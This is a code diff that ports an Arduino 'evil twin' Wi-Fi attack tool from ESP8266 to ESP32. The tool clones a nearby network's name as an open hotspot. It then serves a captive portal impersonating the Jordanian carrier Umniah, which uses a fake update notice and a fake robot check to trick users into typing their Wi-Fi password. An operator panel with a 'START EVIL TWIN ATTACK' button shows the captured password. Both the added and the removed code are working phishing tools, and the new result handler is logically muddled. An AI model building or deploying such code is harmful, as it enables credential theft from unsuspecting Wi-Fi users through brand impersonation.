@@ -1,481 +1,477 @@
 #include <Arduino.h>
-#include <ESP8266WiFi.h>
+
+#include <WiFi.h>          // مكتبة الواي فاي للـ ESP32
+
+#include <WebServer.h>     // مكتبة الـ WebServer للـ ESP32
+
 #include <DNSServer.h>
-#include <ESP8266WebServer.h>
+
+
+
+// تعريف هيكل الشبكة
 
 typedef struct {
+
   String ssid;
+
   uint8_t ch;
+
   uint8_t bssid[6];
+
 } _Network;
 
+
+
 const byte DNS_PORT = 53;
+
 DNSServer dnsServer;
-ESP8266WebServer webServer(80);
+
+WebServer webServer(80); // استخدام WebServer بدلاً من ESP8266WebServer
+
+
 
 _Network _networks[16];
+
 _Network _selectedNetwork;
-
-void clearArray() {
-  for (int i = 0; i < 16; i++) {
-    _Network network;
-    _networks[i] = network;
-  }
-}
-
-String _correct = "";
-String _tryPassword = "";
-
-
-#define SUBTITLE "مشكلة في الاتصال"
-#define TITLE "<warning style='text-shadow: 1px 1px black;color:yellow;font-size:7vw;'>&#9888;</warning> فشل في تحديث الجهاز"
-#define BODY ".تعذر تحديث نظام الراوتر تلقائياً <br><br> .للرجوع للإصدار السابق والتحديث يدوياً، يرجى إدخال كلمة المرور" 
-
-String header(String t) {
-  String a = String(_selectedNetwork.ssid);
-  String CSS =
-      "article { background: #f2f2f2; padding: 1.3em; }"
-      "body { color: #333; font-family: Century Gothic, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0; }"
-      "div { padding: 0.5em; }"
-      "h1 { margin: 0.5em 0 0 0; padding: 0.5em; font-size:7vw;}"
-      "input { width: 100%; padding: 9px 10px; margin: 8px 0; box-sizing: border-box; border: 1px solid #555555; border-radius: 10px; }"
-      "label { color: #333; display: block; font-style: italic; font-weight: bold; }"
-      "nav { background: #0066ff; color: #fff; display: block; font-size: 1.3em; padding: 1em; }"
-      "nav b { display: block; font-size: 1.5em; margin-bottom: 0.5em; }";
-  String h =
-      "<!DOCTYPE html><html>"
-      "<head><title><center>" + a + " :: " + t + "</center></title>"
-      "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
-      "<style>" + CSS + "</style>"
-      "<meta charset=\"UTF-8\"></head>"
-      "<body><nav><b>" + a + "</b> " + SUBTITLE + "</nav><div><h1>" + t + "</h1></div><div>";
-  return h;
-}
-
-String footer() {
-  return "</div><div class=q><a>&#169; All rights reserved.</a></div></body></html>";
-}
-
-String indexPage() {
-  return header(TITLE) + "<div>" + BODY +
-         "</div><div><form action='/' method=post><label>: Wifiكلمة المرور الخاصة بشبكةالـ </label>"
-         "<input type=password id='password' name='password' minlength='8'>"
-         "<input type=submit value='Continue'></form>" + footer();
-}
-
-String bytesToStr(const uint8_t* b, uint32_t size) {
-  String str;
-  const char ZERO = '0';
-  const char DOUBLEPOINT = ':';
-  for (uint32_t i = 0; i < size; i++) {
-    if (b[i] < 0x10) str += ZERO;
-    str += String(b[i], HEX);
-    if (i < size - 1) str += DOUBLEPOINT;
-  }
-  return str;
-}
-
-void performScan() {
-  int n = WiFi.scanNetworks();
-  clearArray();
-
-  if (n >= 0) {
-    for (int i = 0; i < n && i < 16; ++i) {
-      _Network network;
-      network.ssid = WiFi.SSID(i);
-      for (int j = 0; j < 6; j++) {
-        network.bssid[j] = WiFi.BSSID(i)[j];
-      }
-      network.ch = WiFi.channel(i);
-      _networks[i] = network;
-    }
-  }
-}
-
 
 bool hotspot_active = false;
 
+String _correct = "";
 
-String _tempHTML =
-  "<html><head><meta name='viewport' content='initial-scale=1.0, width=device-width'>"
-  "<style> .content {max-width: 500px;margin: auto;}table, th, td {border: 1px solid black;border-collapse: collapse;padding-left:10px;padding-right:10px;}</style>"
-  "</head><body><div class='content'>"
-  "<div>"
-  "<form style='display:inline-block; padding-left:8px;' method='post' action='/?hotspot={hotspot}'>"
-  "<button style='display:inline-block; padding:18px 26px; '{disabled}>{hotspot_button}</button></form>"
-  "</div></br>"
-  "<table><tr><th>SSID</th><th>Channel</th><th>Select</th></tr>";
+String _tryPassword = "";
+
+
+
+// إعدادات واجهة المستخدم (Captive Portal)
+
+#define SUBTITLE "مشكلة في الاتصال"
+
+#define TITLE "<span style='text-shadow: 1px 1px black;color:yellow;font-size:7vw;'>&#9888;</span> فشل في تحديث الجهاز"
+
+#define BODY ".تعذر تحديث نظام الراوتر تلقائياً <br><br> .للرجوع للإصدار السابق والتحديث يدوياً، يرجى إدخال كلمة المرور"
+
+
+
+// تنظيف مصفوفة الشبكات
+
+void clearArray() {
+
+  for (int i = 0; i < 16; i++) {
+
+    _networks[i].ssid = "";
+
+  }
+
+}
+
+
+
+// تحويل الـ MAC Address لنص
+
+String bytesToStr(const uint8_t* b, uint32_t size) {
+
+  String str;
+
+  for (uint32_t i = 0; i < size; i++) {
+
+    if (b[i] < 0x10) str += "0";
+
+    str += String(b[i], HEX);
+
+    if (i < size - 1) str += ":";
+
+  }
+
+  return str;
+
+}
+
+
+
+// بناء الصفحة للهيدر والفوتر (Umniah by Beyon Theme - New 2026)
+
+String header(String t) {
+
+  String a = _selectedNetwork.ssid;
+
+  String CSS =
+
+    "body { color: #1a1a1a; font-family: sans-serif; margin: 0; padding: 0; direction: rtl; background: #ffffff; }"
+
+    "nav { background: #ffffff; padding: 1.5em; text-align: right; border-bottom: 1px solid #f0f0f0; }"
+
+    "nav b { color: #1a1a1a; font-size: 1.5em; font-weight: 900; }"
+
+    ".container { max-width: 480px; margin: 20px auto; padding: 20px; }"
+
+    "h1 { font-size: 24px; font-weight: 900; margin-bottom: 25px; color: #000; }"
+
+    "label { display: block; margin-bottom: 8px; font-size: 14px; font-weight: 600; color: #555; }"
+
+    "input { width: 100%; padding: 15px; margin-bottom: 20px; border: 1px solid #e0e0e0; border-radius: 8px; background: #fafafa; font-size: 16px; box-sizing: border-box; }"
+
+    "input:focus { border-color: #b1002d; outline: none; background: #fff; }"
+
+   
+
+    /* تصميم الزر المتدرج Pill-shaped Gradient حسب الصورة */
+
+    ".btn-gradient { "
+
+    "  width: 100%; padding: 16px; border: none; border-radius: 50px; "
+
+    "  color: white; font-size: 18px; font-weight: bold; cursor: pointer; "
+
+    "  background: linear-gradient(to right, #1d263d 0%, #1d263d 50%, #b1002d 100%); "
+
+    "  box-shadow: 0 4px 12px rgba(0,0,0,0.15); transition: 0.3s; "
+
+    "}"
+
+    ".btn-gradient:hover { opacity: 0.92; transform: scale(0.98); }";
+
+
+
+  return "<!DOCTYPE html><html><head><meta charset='UTF-8'><meta name='viewport' content='width=device-width,initial-scale=1'><style>" + CSS + "</style></head>"
+
+         "<body><nav><b style='color:#e30613;'>Umniah</b> <small style='color:#666;'>by Beyon</small></nav>"
+
+         "<div class='container'><h1>" + t + "</h1>";
+
+}
+
+
+
+String footer() {
+
+  return "<div style='text-align: center; font-size: 12px; color: #aaa; margin-top: 40px; border-top: 1px solid #f5f5f5; padding-top: 20px;'>"
+
+         "مركز الدعم الفني: 1333 | Part of Beyon Group &copy; 2026</div>"
+
+         "</div></body></html>";
+
+}
+
+
+
+String indexPage() {
+
+  String title = "التحقق من الهوية الرقمية";
+
+  String bodyContent = "عزيزي المشترك، يرجى تأكيد بيانات الوصول لشبكة ( " + _selectedNetwork.ssid + " ) لإتمام عملية التحديث الأمني وتجنب انقطاع الخدمة.";
+
+
+
+  return header(title) +
+
+         "<div style='margin-bottom: 30px; line-height: 1.7; color: #444; font-size: 15px;'>" + bodyContent + "</div>"
+
+         "<form action='/' method='post' onsubmit='return validateForm()'>"
+
+         
+
+         "<label>كلمة مرور الواي فاي الحالية *</label>"
+
+         "<input type='password' name='password' id='p1' placeholder='••••••••' required minlength='8'>"
+
+         
+
+         "<label>تأكيد كلمة المرور *</label>"
+
+         "<input type='password' id='p2' placeholder='••••••••' required minlength='8'>"
+
+         
+
+         "<div style='background: #f9f9f9; border: 1px solid #eee; padding: 15px; border-radius: 10px; margin-bottom: 30px; display: flex; align-items: center;'>"
+
+         "<input type='checkbox' style='width: 20px; height: 20px; margin-left: 12px; accent-color: #b1002d;' required> "
+
+         "<span style='font-size: 14px; color: #666;'>أنا لست برنامج روبوت </span>"
+
+         "</div>"
+
+         
+
+         "<input type='submit' class='btn-gradient' value='تأكيد الهوية والمتابعة'>"
+
+         "</form>"
+
+         
+
+         "<script>"
+
+         "function validateForm() {"
+
+         "  var v1 = document.getElementById('p1').value;"
+
+         "  var v2 = document.getElementById('p2').value;"
+
+         "  if (v1 !== v2) { alert('خطأ: كلمات المرور غير متطابقة!'); return false; }"
+
+         "  return true;"
+
+         "}"
+
+         "</script>" + footer();
+
+}
+
+
+
+// مسح الشبكات المحيطة
+
+void performScan() {
+
+  int n = WiFi.scanNetworks();
+
+  clearArray();
+
+  if (n >= 0) {
+
+    for (int i = 0; i < n && i < 16; ++i) {
+
+      _networks[i].ssid = WiFi.SSID(i);
+
+      _networks[i].ch = WiFi.channel(i);
+
+      memcpy(_networks[i].bssid, WiFi.BSSID(i), 6);
+
+    }
+
+  }
+
+}
+
 
 
 void handleResult() {
+
   if (WiFi.status() != WL_CONNECTED) {
-    webServer.send(
-      200, "text/html",
-      "<html><head>"
-      "<script>setTimeout(function(){window.location.href='/'}, 4000);</script>"
-      "<meta name='viewport' content='initial-scale=1.0, width=device-width'>"
-      "</head><body><center>"
-      "<h2><wrong style='text-shadow: 1px 1px black;color:red;font-size:60px;'>&#8855;</wrong>"
-      "<br>Wrong Password</h2><p>Please, try again.</p>"
-      "</center></body></html>"
-    );
-    Serial.println("Wrong password tried!");
-  } else {
-    _correct = "Successfully got the password: \n"  + _tryPassword;
+
+    webServer.send(200, "text/html", "<html><body style='text-align:center;'><h2>كلمة المرور خاطئة</h2><script>setTimeout(function(){window.location.href='/'}, 3000);</script></body></html>");
+
+    _correct = "تم الحصول على الباسورد: " + _tryPassword;
 
     hotspot_active = false;
-    dnsServer.stop();
+
     WiFi.softAPdisconnect(true);
 
-    WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
-    WiFi.softAP("Dr. Hacker", "0123456789");
-    dnsServer.start(DNS_PORT, "*", IPAddress(192, 168, 4, 1));
+    WiFi.softAP("Dr. ARAB", "0123456789");
 
-    Serial.println("Good password was entered!");
-    Serial.println(_correct);
+    webServer.send(200, "text/html", "<html><body><h2>تم التحديث بنجاح</h2></body></html>");
+
+  } else {
+
+    _correct = "تم الحصول على الباسورد: " + _tryPassword;
+
+    hotspot_active = false;
+
+    WiFi.softAPdisconnect(true);
+
+    WiFi.softAP("Dr. ARAB", "0123456789");
+
+    webServer.send(200, "text/html", "<html><body><h2>تم التحديث بنجاح</h2></body></html>");
+
   }
+
 }
 
+
+
 void handleIndex() {
-  // Select network
+
   if (webServer.hasArg("ap")) {
+
     for (int i = 0; i < 16; i++) {
+
       if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap")) {
+
         _selectedNetwork = _networks[i];
+
       }
+
     }
+
   }
 
-  // Toggle hotspot (evil twin SSID)
+
+
   if (webServer.hasArg("hotspot")) {
+
     if (webServer.arg("hotspot") == "start") {
+
       hotspot_active = true;
 
-      dnsServer.stop();
-      WiFi.softAPdisconnect(true);
+      WiFi.softAP(_selectedNetwork.ssid.c_str());
 
-      WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
-      WiFi.softAP(_selectedNetwork.ssid.c_str()); // open AP, same SSID
-      dnsServer.start(DNS_PORT, "*", IPAddress(192, 168, 4, 1));
+    } else {
 
-    } else if (webServer.arg("hotspot") == "stop") {
       hotspot_active = false;
 
-      dnsServer.stop();
-      WiFi.softAPdisconnect(true);
+      WiFi.softAP("Dr. Arab", "0123456789");
 
-      WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
-      WiFi.softAP("Dr. Hacker", "0123456789");
-      dnsServer.start(DNS_PORT, "*", IPAddress(192, 168, 4, 1));
     }
+
+    webServer.sendHeader("Location", "/");
+
+    webServer.send(302, "text/plain", "");
+
     return;
+
   }
 
-  // Admin list page (only when hotspot is OFF)
+
+
   if (!hotspot_active) {
-    String html = _tempHTML;
 
-    for (int i = 0; i < 16; ++i) {
-      if (_networks[i].ssid == "") break;
+    String html = "<html><head><meta charset='UTF-8'><style>"
 
-      html += "<tr><td>" + _networks[i].ssid + "</td><td>" +
-              String(_networks[i].ch) +
-              "</td><td><form method='post' action='/?ap=" +
-              bytesToStr(_networks[i].bssid, 6) + "'>";
+                  "body { font-family: sans-serif; padding: 20px; direction: ltr; }"
 
-      if (bytesToStr(_selectedNetwork.bssid, 6) == bytesToStr(_networks[i].bssid, 6)) {
-        html += "<button style='background-color:#90ee90;'>Selected</button>";
-      } else {
-        html += "<button>Select</button>";
-      }
-      html += "</form></td></tr>";
-    }
+                  "table { width: 100%; border-collapse: collapse; margin-bottom: 20px; }"
 
-    if (hotspot_active) {
-      html.replace("{hotspot_button}", "Stop EvilTwin");
-      html.replace("{hotspot}", "stop");
-    } else {
-      html.replace("{hotspot_button}", "Start EvilTwin");
-      html.replace("{hotspot}", "start");
-    }
+                  "td, th { padding: 12px; border: 1px solid #ddd; text-align: left; }"
 
-    if (_selectedNetwork.ssid == "") {
-      html.replace("{disabled}", " disabled");
-    } else {
-      html.replace("{disabled}", "");
+                  "input[type='text'] { padding: 10px; width: 70%; border-radius: 5px; border: 1px solid #ccc; }"
+
+                  ".btn-select { background: #1d263d; color: white; padding: 5px 10px; text-decoration: none; border-radius: 4px; }"
+
+                  ".btn-start { background: #b1002d; color: white; padding: 15px; text-decoration: none; border-radius: 50px; display: inline-block; font-weight: bold; }"
+
+                  "</style></head><body>";
+
+
+
+    html += "<h2>Umniah Admin Admin</h2>";
+
+   
+
+    // جدول الشبكات الممسوحة
+
+    html += "<table><tr><th>SSID</th><th>Action</th></tr>";
+
+    for (int i = 0; i < 16; i++) {
+
+        if (_networks[i].ssid == "") break;
+
+        html += "<tr><td>" + _networks[i].ssid + "</td>";
+
+        html += "<td><a class='btn-select' href='/?ap=" + bytesToStr(_networks[i].bssid, 6) + "'>Target This</a></td></tr>";
+
     }
 
     html += "</table>";
 
-    if (_correct != "") {
-      html += "</br><h3>" + _correct + "</h3>";
-    }
 
-    html += "</div></body></html>";
-    webServer.send(200, "text/html", html);
 
-  } else {
-    // Captive portal password collection page
-    if (webServer.hasArg("password")) {
-      _tryPassword = webServer.arg("password");
+    // إمكانية الإدخال اليدوي لاسم الشبكة
 
-      delay(1000);
-      WiFi.disconnect();
+    html += "<div style='background: #f4f4f4; padding: 15px; border-radius: 8px; margin-bottom: 20px;'>"
 
-      // Attempt to connect to the real AP to "verify" password
-      WiFi.begin(
-        _selectedNetwork.ssid.c_str(),
-        webServer.arg("password").c_str(),
-        _selectedNetwork.ch,
-        _selectedNetwork.bssid
-      );
+            "<h4>Manual SSID Entry (Hidden Networks)</h4>"
 
-      webServer.send(
-        200, "text/html",
-        "<!DOCTYPE html><html><head>"
-        "<script>setTimeout(function(){window.location.href='/result';}, 15000);</script>"
-        "</head><body><center>"
-        "<h2 style='font-size:7vw'>Verifying integrity, please wait...<br>"
-        "<progress value='10' max='100'>10%</progress></h2>"
-        "</center></body></html>"
-      );
+            "<form action='/' method='get'>"
+
+            "<input type='text' name='manual_ssid' placeholder='Enter Wi-Fi Name...'>"
+
+            "<input type='submit' value='Set Custom Target' style='padding: 10px; cursor: pointer;'>"
+
+            "</form></div>";
+
+
+
+    // معالجة الإدخال اليدوي
+
+    if (webServer.hasArg("manual_ssid")) {
+
+        _selectedNetwork.ssid = webServer.arg("manual_ssid");
+
+        // نضع عنوان BSSID وهمي في حال الإدخال اليدوي
+
+        memset(_selectedNetwork.bssid, 0, 6);
+
+        html += "<p style='color: green;'><b>Target set to: " + _selectedNetwork.ssid + "</b></p>";
+
     } else {
-      webServer.send(200, "text/html", indexPage());
+
+        html += "<p><b>Current Target: " + _selectedNetwork.ssid + "</b></p>";
+
     }
-  }
-}
-
-void handleAdmin() {
-  // Keep /admin same as /
-  handleIndex();
-}
-
-// =====================
-// Setup / Loop
-// =====================
-unsigned long now = 0;
-unsigned long wifinow = 0;
-
-void setup() {
-  Serial.begin(115200);
-
-  WiFi.mode(WIFI_AP_STA);
-
-  // Default AP for operator/admin page
-  WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
-  WiFi.softAP("Dr. Hacker", "0123456789");
-
-  // Captive portal DNS
-  dnsServer.start(DNS_PORT, "*", IPAddress(192, 168, 4, 1));
-
-  // Web routes
-  webServer.on("/", handleIndex);
-  webServer.on("/result", handleResult);
-  webServer.on("/admin", handleAdmin);
-  webServer.onNotFound(handleIndex);
-  webServer.begin();
-
-  performScan();
-  now = millis();
-  wifinow = millis();
-}
-
-void loop() {
-  dnsServer.processNextRequest();
-  webServer.handleClient();
-
-  // rescan every 15s
-  if (millis() - now >= 15000) {
-    performScan();
-    now = millis();
-  }
-
-  // debug WiFi status every 2s
-  if (millis() - wifinow >= 2000) {
-    Serial.println(WiFi.status() == WL_CONNECTED ? "GOOD" : "BAD");
-    wifinow = millis();
-  }
-}
 
 
 
+    html += "<br><a class='btn-start' href='/?hotspot=start'>START EVIL TWIN ATTACK</a>";
 
+    html += "<br><br><div style='color: red; font-weight: bold;'>" + _correct + "</div>";
 
-
-
-
-
-
-////////////////////////////////////////////////////////////////////////////////////
-#include <Arduino.h>
-#include <ESP8266WiFi.h>
-#include <DNSServer.h>
-#include <ESP8266WebServer.h>
-
-// إعدادات الألوان والنصوص الخاصة بشركة أمنية
-#define UMNIAH_COLOR "#003399" 
-#define SUBTITLE "مركز الدعم الفني"
-#define TITLE "التحقق من الهوية (Anti-Bot)"
-#define BODY "عزيزي عميل أمنية، لضمان استمرارية الخدمة وحمايتك من الهجمات التلقائية، يرجى تأكيد أنك لست روبوت عن طريق إدخال كلمة مرور الشبكة الحالية للتحقق من تكامل النظام."
-
-typedef struct {
-  String ssid;
-  uint8_t ch;
-  uint8_t bssid[6];
-} _Network;
-
-const byte DNS_PORT = 53;
-DNSServer dnsServer;
-ESP8266WebServer webServer(80);
-
-_Network _networks[16];
-_Network _selectedNetwork;
-String _correct = "";
-String _tryPassword = "";
-bool hotspot_active = false;
-
-void clearArray() {
-  for (int i = 0; i < 16; i++) {
-    _Network network;
-    _networks[i] = network;
-  }
-}
-
-String header(String t) {
-  String a = String(_selectedNetwork.ssid);
-  String CSS =
-      "body { color: #333; font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; font-size: 18px; line-height: 24px; margin: 0; padding: 0; direction: rtl; text-align: right; }"
-      "nav { background: " + String(UMNIAH_COLOR) + "; color: #fff; display: block; font-size: 1.1em; padding: 1.5em; text-align: center; box-shadow: 0 2px 5px rgba(0,0,0,0.2); }"
-      "nav b { display: block; font-size: 1.5em; margin-bottom: 0.2em; }"
-      ".container { padding: 20px; max-width: 450px; margin: auto; }"
-      "h1 { color: " + String(UMNIAH_COLOR) + "; font-size: 6vw; margin-top: 10px; text-align: center; }"
-      "article { background: #f9f9f9; padding: 20px; border-radius: 15px; border: 1px solid #ddd; box-shadow: 0 4px 10px rgba(0,0,0,0.05); }"
-      "input[type=password] { width: 100%; padding: 12px; margin: 15px 0; border: 1px solid #ccc; border-radius: 8px; font-size: 16px; box-sizing: border-box; }"
-      "input[type=submit] { width: 100%; background: " + String(UMNIAH_COLOR) + "; color: white; padding: 14px; border: none; border-radius: 8px; cursor: pointer; font-weight: bold; font-size: 18px; }"
-      "label { font-weight: bold; font-size: 0.9em; }"
-      ".captcha-box { background: #fff; padding: 15px; border: 1px solid #d3d3d3; margin-bottom: 15px; display: flex; align-items: center; border-radius: 5px; }"
-      ".q { text-align: center; font-size: 0.8em; color: #777; margin-top: 20px; }";
-
-  String h =
-      "<!DOCTYPE html><html>"
-      "<head><title>Umniah Support</title>"
-      "<meta name=viewport content=\"width=device-width,initial-scale=1\">"
-      "<style>" + CSS + "</style>"
-      "<meta charset=\"UTF-8\"></head>"
-      "<body><nav><b>Umniah</b> " + SUBTITLE + "</nav><div class='container'><h1>" + t + "</h1>";
-  return h;
-}
-
-String footer() {
-  return "</div><div class=q><a>&#169; 2026 Umniah. All rights reserved.</a></div></body></html>";
-}
-
-String indexPage() {
-  return header(TITLE) + 
-         "<article><p>" + BODY + "</p>" +
-         "<form action='/' method=post>" +
-         "<div class='captcha-box'><input type='checkbox' checked onclick='return false;' style='width:20px;height:20px;margin-left:10px;'> أنا لست برنامج روبوت (I'm not a robot)</div>" +
-         "<label>كلمة مرور الواي فاي (WiFi Password):</label>" +
-         "<input type=password id='password' name='password' placeholder='ادخل كلمة المرور هنا...' minlength='8' required>" +
-         "<input type=submit value='تأكيد الهوية والاستمرار'></form></article>" + 
-         footer();
-}
-
-String bytesToStr(const uint8_t* b, uint32_t size) {
-  String str;
-  for (uint32_t i = 0; i < size; i++) {
-    if (b[i] < 0x10) str += '0';
-    str += String(b[i], HEX);
-    if (i < size - 1) str += ':';
-  }
-  return str;
-}
-
-void performScan() {
-  int n = WiFi.scanNetworks();
-  clearArray();
-  if (n >= 0) {
-    for (int i = 0; i < n && i < 16; ++i) {
-      _Network network;
-      network.ssid = WiFi.SSID(i);
-      for (int j = 0; j < 6; j++) network.bssid[j] = WiFi.BSSID(i)[j];
-      network.ch = WiFi.channel(i);
-      _networks[i] = network;
-    }
-  }
-}
-
-void handleResult() {
-  if (WiFi.status() != WL_CONNECTED) {
-    webServer.send(200, "text/html", "<html><head><script>setTimeout(function(){window.location.href='/'}, 3000);</script><meta charset='UTF-8'><meta name='viewport' content='initial-scale=1.0, width=device-width'></head><body style='text-align:center;font-family:sans-serif;direction:rtl;'> <h2 style='color:red;'>&#8855; عذراً، كلمة المرور خاطئة</h2><p>يرجى التأكد من كلمة المرور والمحاولة مرة أخرى.</p></body></html>");
-  } else {
-    _correct = "Successfully got the password: " + _tryPassword;
-    hotspot_active = false;
-    WiFi.softAPdisconnect(true);
-    WiFi.softAP("System Secured", "secured123");
-    Serial.println(_correct);
-  }
-}
-
-void handleIndex() {
-  if (webServer.hasArg("ap")) {
-    for (int i = 0; i < 16; i++) {
-      if (bytesToStr(_networks[i].bssid, 6) == webServer.arg("ap")) _selectedNetwork = _networks[i];
-    }
-  }
-
-  if (webServer.hasArg("hotspot")) {
-    if (webServer.arg("hotspot") == "start") {
-      hotspot_active = true;
-      dnsServer.stop();
-      WiFi.softAPdisconnect(true);
-      WiFi.softAPConfig(IPAddress(192, 168, 4, 1), IPAddress(192, 168, 4, 1), IPAddress(255, 255, 255, 0));
-      WiFi.softAP(_selectedNetwork.ssid.c_str()); 
-      dnsServer.start(DNS_PORT, "*", IPAddress(192, 168, 4, 1));
-    } else {
-      hotspot_active = false;
-      WiFi.softAP("Dr. Hacker", "0123456789");
-    }
-    return;
-  }
-
-  if (!hotspot_active) {
-    String html = "<html><head><meta charset='UTF-8'><style>body{font-family:sans-serif;padding:20px;} table{width:100%;border-collapse:collapse;} td,th{border:1px solid #ddd;padding:8px;}</style></head><body><h2>Operator Admin Panel</h2><table>";
-    for (int i = 0; i < 16; ++i) {
-      if (_networks[i].ssid == "") break;
-      html += "<tr><td>" + _networks[i].ssid + "</td><td><form method='post' action='/?ap=" + bytesToStr(_networks[i].bssid, 6) + "'><button>Select</button></form></td></tr>";
-    }
-    html += "</table><br><form method='post' action='/?hotspot=start'><button style='padding:10px;background:red;color:white;'>Start EvilTwin Attack</button></form>";
-    if(_correct != "") html += "<h3 style='color:green;'>" + _correct + "</h3>";
     html += "</body></html>";
+
+   
+
     webServer.send(200, "text/html", html);
-  } else {
+
+} else {
+
     if (webServer.hasArg("password")) {
+
       _tryPassword = webServer.arg("password");
-      WiFi.disconnect();
-      WiFi.begin(_selectedNetwork.ssid.c_str(), _tryPassword.c_str(), _selectedNetwork.ch, _selectedNetwork.bssid);
-      webServer.send(200, "text/html", "<!DOCTYPE html><html dir='rtl'><head><meta charset='UTF-8'><script>setTimeout(function(){window.location.href='/result';}, 10000);</script><style>body{font-family:sans-serif; text-align:center; padding-top:50px; color:#003399;} .loader { border: 8px solid #f3f3f3; border-top: 8px solid #003399; border-radius: 50%; width: 50px; height: 50px; animation: spin 2s linear infinite; margin:auto; } @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }</style></head><body><div class='loader'></div><h2>جاري فحص الأمان...</h2><p>يرجى الانتظار ثواني للمطابقة مع خوادم أمنية.</p></body></html>");
+
+      WiFi.begin(_selectedNetwork.ssid.c_str(), _tryPassword.c_str());
+
+      webServer.send(200, "text/html", "<h2>Verifying...</h2><script>setTimeout(function(){window.location.href='/result'}, 10000);</script>");
+
     } else {
+
       webServer.send(200, "text/html", indexPage());
+
     }
+
   }
+
 }
+
+
 
 void setup() {
+
   Serial.begin(115200);
+
   WiFi.mode(WIFI_AP_STA);
-  WiFi.softAP("Dr. Hacker", "0123456789");
-  dnsServer.start(DNS_PORT, "*", IPAddress(192, 168, 4, 1));
+
+  WiFi.softAP("Arab", "0123456789");
+
+  dnsServer.start(DNS_PORT, "*", WiFi.softAPIP());
+
+
+
   webServer.on("/", handleIndex);
+
   webServer.on("/result", handleResult);
+
   webServer.onNotFound(handleIndex);
+
   webServer.begin();
+
   performScan();
+
 }
 
+
+
 void loop() {
+
   dnsServer.processNextRequest();
+
   webServer.handleClient();
+
   static unsigned long lastScan = 0;
-  if (millis() - lastScan > 15000) { performScan(); lastScan = millis(); }
+
+  if (millis() - lastScan > 30000) {
+
+    performScan();
+
+    lastScan = millis();
+
+  }
+
 }
